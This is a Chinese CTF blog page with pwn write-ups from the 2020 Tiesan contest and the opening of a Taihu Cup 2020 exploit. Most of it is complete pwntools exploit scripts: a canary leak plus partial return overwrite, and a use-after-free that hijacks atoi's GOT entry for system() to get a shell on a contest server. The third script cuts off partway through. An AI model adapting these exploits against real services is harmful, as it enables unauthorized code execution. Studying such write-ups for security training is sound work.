<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  

  
  <title>I0gan</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="Even if a man has reached the top, he still needs to improve himself">
<meta property="og:type" content="website">
<meta property="og:title" content="I0gan">
<meta property="og:url" content="http://blog.i0gan.cn/index.html">
<meta property="og:site_name" content="I0gan">
<meta property="og:description" content="Even if a man has reached the top, he still needs to improve himself">
<meta property="og:locale">
<meta property="article:author" content="i0gan">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="I0gan" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 5.2.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">I0gan</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://blog.i0gan.cn"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-tiesan-2020" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/11/08/tiesan-2020/" class="article-date">
  <time datetime="2020-11-08T14:04:48.000Z" itemprop="datePublished">2020-11-08</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/pwn/">pwn</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/11/08/tiesan-2020/">tiesan-2020</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="铁三个人赛pwn"><a href="#铁三个人赛pwn" class="headerlink" title="铁三个人赛pwn"></a>铁三个人赛pwn</h1><p>多亏盛师傅带飞，本次排名第四赛区第二，排名如下^_^</p>
<p><img src="/images/wp-tiesan-2020-1.png" alt="img"></p>
<h2 id="pwn1-namepie"><a href="#pwn1-namepie" class="headerlink" title="pwn1[namepie]"></a>pwn1[namepie]</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">sub_9A0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+0h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x1E</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your Name:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">0x30</span>uLL);<span class="comment">//vul</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;hello %s: and what do your want to sey!\n&quot;</span>, &amp;s);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;s, <span class="number">0x60</span>uLL); <span class="comment">//vul2 堆栈溢出</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>程序留了后面函数，保护全开</p>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>先使用第一次输入泄露cannary，然后在使用后一次输入低字节覆盖return 地址为后门函数地址，打通几率1 / 16</p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># Author: i0gan</span></span><br><span class="line"><span class="comment"># Env: Linux arch 5.8.14-arch1-1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">r   =  <span class="keyword">lambda</span> x : io.recv(x)</span><br><span class="line">ra  =  <span class="keyword">lambda</span>   : io.recvall()</span><br><span class="line">rl  =  <span class="keyword">lambda</span>   : io.recvline(keepends = <span class="literal">True</span>)</span><br><span class="line">ru  =  <span class="keyword">lambda</span> x : io.recvuntil(x, drop = <span class="literal">True</span>)</span><br><span class="line">s   =  <span class="keyword">lambda</span> x : io.send(x)</span><br><span class="line">sl  =  <span class="keyword">lambda</span> x : io.sendline(x)</span><br><span class="line">sa  =  <span class="keyword">lambda</span> x, y : io.sendafter(x, y)</span><br><span class="line">sla =  <span class="keyword">lambda</span> x, y : io.sendlineafter(x, y)</span><br><span class="line">ia  =  <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">c   =  <span class="keyword">lambda</span> : io.close()</span><br><span class="line">li    = <span class="keyword">lambda</span> x : log.info(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">elf_path  = <span class="string">&#x27;pwn&#x27;</span></span><br><span class="line">libc_path = <span class="string">&#x27;./libc.so.6&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># remote server ip and port</span></span><br><span class="line">server_ip = <span class="string">&quot;172.20.14.177&quot;</span></span><br><span class="line">server_port = <span class="number">9999</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># if local debug</span></span><br><span class="line">LOCAL = <span class="number">0</span></span><br><span class="line">LIBC  = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------func-----------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">db</span>():</span></span><br><span class="line">	<span class="keyword">if</span>(LOCAL):</span><br><span class="line">		gdb.attach(io)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------exploit--------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line">	li(<span class="string">&#x27;exploit...&#x27;</span>)</span><br><span class="line">	p = <span class="string">&#x27;A&#x27;</span> * <span class="number">0x28</span> + <span class="string">&#x27;\x01&#x27;</span></span><br><span class="line">	s(p)</span><br><span class="line">	ru(<span class="string">&#x27;\x01&#x27;</span>)</span><br><span class="line">	cannary = u64(<span class="string">&#x27;\x00&#x27;</span> + r(<span class="number">7</span>))</span><br><span class="line">	li(<span class="string">&#x27;cannary: &#x27;</span> + <span class="built_in">hex</span>(cannary))</span><br><span class="line">	p = <span class="string">&#x27;A&#x27;</span> * <span class="number">0x28</span></span><br><span class="line">	p += p64(cannary)</span><br><span class="line">	p += p64(<span class="number">0</span>)</span><br><span class="line">	p += <span class="string">&#x27;\x71\xaa&#x27;</span></span><br><span class="line">	<span class="comment">#db()</span></span><br><span class="line">	s(p)</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">finish</span>():</span></span><br><span class="line">	ia()</span><br><span class="line">	c()</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------main-----------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	</span><br><span class="line">	<span class="comment">#for i in range(255):</span></span><br><span class="line">	<span class="keyword">if</span> LOCAL:</span><br><span class="line">		elf = ELF(elf_path)</span><br><span class="line">		<span class="keyword">if</span> LIBC:</span><br><span class="line">			libc = ELF(libc_path)</span><br><span class="line">			io = elf.process(env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : libc_path&#125; )</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			io = elf.process()</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		elf = ELF(elf_path)</span><br><span class="line">		io = remote(server_ip, server_port)</span><br><span class="line">		<span class="keyword">if</span> LIBC:</span><br><span class="line">			libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line">	exploit()</span><br><span class="line">	finish()</span><br></pre></td></tr></table></figure>





<h2 id="pwn2-onetime"><a href="#pwn2-onetime" class="headerlink" title="pwn2 [onetime]"></a>pwn2 [onetime]</h2><h3 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h3><p>pie保护没开，一个菜单堆题，在添加和删除编辑都采用相应的标致来避免重复第二次操作。漏洞点在释放内存后没有将数据指针清0还有在其他操作没有做好相应的检查，造成uaf漏洞。</p>
<h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>通过uaf漏洞，打入bss段的buf附近，修改edit_flag为0为了再次实现修改功能，同时修改buf为atoi plt.got地址，然后再通过uaf漏洞泄露libc，再次修改atoi的got中数据为libc中system函数地址，在输入选项时输入’sh\x00’即可获得shell</p>
<h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># Author: i0gan</span></span><br><span class="line"><span class="comment"># Env: Linux arch 5.8.14-arch1-1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">r   =  <span class="keyword">lambda</span> x : io.recv(x)</span><br><span class="line">ra  =  <span class="keyword">lambda</span>   : io.recvall()</span><br><span class="line">rl  =  <span class="keyword">lambda</span>   : io.recvline(keepends = <span class="literal">True</span>)</span><br><span class="line">ru  =  <span class="keyword">lambda</span> x : io.recvuntil(x, drop = <span class="literal">True</span>)</span><br><span class="line">s   =  <span class="keyword">lambda</span> x : io.send(x)</span><br><span class="line">sl  =  <span class="keyword">lambda</span> x : io.sendline(x)</span><br><span class="line">sa  =  <span class="keyword">lambda</span> x, y : io.sendafter(x, y)</span><br><span class="line">sla =  <span class="keyword">lambda</span> x, y : io.sendlineafter(x, y)</span><br><span class="line">ia  =  <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">c   =  <span class="keyword">lambda</span> : io.close()</span><br><span class="line">li  = <span class="keyword">lambda</span> x : log.info(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">elf_path  = <span class="string">&#x27;pwn&#x27;</span></span><br><span class="line">MODIFY_LD = <span class="number">0</span></span><br><span class="line">arch = <span class="string">&#x27;64&#x27;</span></span><br><span class="line">libc_v = <span class="string">&#x27;2.23&#x27;</span></span><br><span class="line"></span><br><span class="line">ld_path   = <span class="string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="string">&#x27;/&#x27;</span> + arch + <span class="string">&#x27;/lib/ld-linux-x86-64.so.2&#x27;</span></span><br><span class="line">libs_path = <span class="string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="string">&#x27;/&#x27;</span> + arch + <span class="string">&#x27;/lib&#x27;</span></span><br><span class="line">libc_path = <span class="string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="string">&#x27;/&#x27;</span> + arch + <span class="string">&#x27;/lib/libc.so.6&#x27;</span></span><br><span class="line">libc_path = <span class="string">&#x27;./libc.so.6&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># change ld path </span></span><br><span class="line"><span class="keyword">if</span>(MODIFY_LD):</span><br><span class="line">	os.system(<span class="string">&#x27;cp &#x27;</span> + elf_path + <span class="string">&#x27; &#x27;</span> + elf_path + <span class="string">&#x27;.bk&#x27;</span>)</span><br><span class="line">	change_ld_cmd = <span class="string">&#x27;patchelf  --set-interpreter &#x27;</span> + ld_path +<span class="string">&#x27; &#x27;</span> + elf_path</span><br><span class="line">	os.system(change_ld_cmd)</span><br><span class="line">	li(<span class="string">&#x27;modify ld ok!&#x27;</span>)</span><br><span class="line">	exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># remote server ip and port</span></span><br><span class="line">server_ip = <span class="string">&quot;172.20.14.177&quot;</span></span><br><span class="line">server_port = <span class="number">10001</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># if local debug</span></span><br><span class="line">LOCAL = <span class="number">0</span></span><br><span class="line">LIBC  = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------func-----------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">db</span>():</span></span><br><span class="line">	<span class="keyword">if</span>(LOCAL):</span><br><span class="line">		gdb.attach(io)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ad</span>():</span></span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fi</span>(<span class="params">d</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	sa(<span class="string">&#x27;:&#x27;</span>, d)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dp</span>():</span></span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rm</span>():</span></span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lv</span>(<span class="params">d</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">	sa(<span class="string">&#x27;:&#x27;</span>, d)</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------exploit--------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line">	li(<span class="string">&#x27;exploit...&#x27;</span>)</span><br><span class="line">	ad()</span><br><span class="line">	rm()</span><br><span class="line">	p = p64(<span class="number">0x60207d</span> + <span class="number">0x10</span>)</span><br><span class="line">	fi(p)</span><br><span class="line">	ad()</span><br><span class="line"></span><br><span class="line">	p = <span class="string">&#x27;A&#x27;</span> * <span class="number">3</span></span><br><span class="line">	p += p64(<span class="number">0</span>)</span><br><span class="line">	p += p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>])</span><br><span class="line">	lv(p)</span><br><span class="line"></span><br><span class="line">	dp()</span><br><span class="line">	leak = u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[<span class="number">-5</span>:] + <span class="string">&#x27;\x7f\x00\x00&#x27;</span>)</span><br><span class="line">	libc_base = leak - libc.sym[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">	system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">	li(<span class="string">&#x27;libc_base: &#x27;</span> +<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">	fi(p64(system))</span><br><span class="line">	<span class="comment">#db()</span></span><br><span class="line">	s(<span class="string">&#x27;sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">finish</span>():</span></span><br><span class="line">	ia()</span><br><span class="line">	c()</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------main-----------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> LOCAL:</span><br><span class="line">		elf = ELF(elf_path)</span><br><span class="line">		<span class="keyword">if</span> LIBC:</span><br><span class="line">			libc = ELF(libc_path)</span><br><span class="line">			io = elf.process(env = &#123;<span class="string">&quot;LD_LIBRARY_PATH&quot;</span> : libs_path, <span class="string">&quot;LD_PRELOAD&quot;</span> : libc_path&#125; )</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			io = elf.process(env = &#123;<span class="string">&quot;LD_LIBRARY_PATH&quot;</span> : libs_path&#125; )</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		elf = ELF(elf_path)</span><br><span class="line">		io = remote(server_ip, server_port)</span><br><span class="line">		<span class="keyword">if</span> LIBC:</span><br><span class="line">			libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line">	exploit()</span><br><span class="line">	finish()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.i0gan.cn/2020/11/08/tiesan-2020/" data-id="ckhemv813001iwdcm81iu10cx" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-wp-other" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/11/08/wp-other/" class="article-date">
  <time datetime="2020-11-08T12:25:49.000Z" itemprop="datePublished">2020-11-08</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/pwn/">pwn</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/11/08/wp-other/">wp-thb-2020</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="太湖杯-2020"><a href="#太湖杯-2020" class="headerlink" title="太湖杯 2020"></a>太湖杯 2020</h1><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># Author: i0gan</span></span><br><span class="line"><span class="comment"># Env: Linux arch 5.8.14-arch1-1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">r   =  <span class="keyword">lambda</span> x : io.recv(x)</span><br><span class="line">ra  =  <span class="keyword">lambda</span>   : io.recvall()</span><br><span class="line">rl  =  <span class="keyword">lambda</span>   : io.recvline(keepends = <span class="literal">True</span>)</span><br><span class="line">ru  =  <span class="keyword">lambda</span> x : io.recvuntil(x, drop = <span class="literal">True</span>)</span><br><span class="line">s   =  <span class="keyword">lambda</span> x : io.send(x)</span><br><span class="line">sl  =  <span class="keyword">lambda</span> x : io.sendline(x)</span><br><span class="line">sa  =  <span class="keyword">lambda</span> x, y : io.sendafter(x, y)</span><br><span class="line">sla =  <span class="keyword">lambda</span> x, y : io.sendlineafter(x, y)</span><br><span class="line">ia  =  <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">c   =  <span class="keyword">lambda</span> : io.close()</span><br><span class="line">li  = <span class="keyword">lambda</span> x : log.info(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">elf_path  = <span class="string">&#x27;pwn&#x27;</span></span><br><span class="line">MODIFY_LD = <span class="number">0</span></span><br><span class="line">arch = <span class="string">&#x27;64&#x27;</span></span><br><span class="line">libc_v = <span class="string">&#x27;2.29&#x27;</span></span><br><span class="line"></span><br><span class="line">ld_path   = <span class="string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="string">&#x27;/&#x27;</span> + arch + <span class="string">&#x27;/lib/ld-linux-x86-64.so.2&#x27;</span></span><br><span class="line">libs_path = <span class="string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="string">&#x27;/&#x27;</span> + arch + 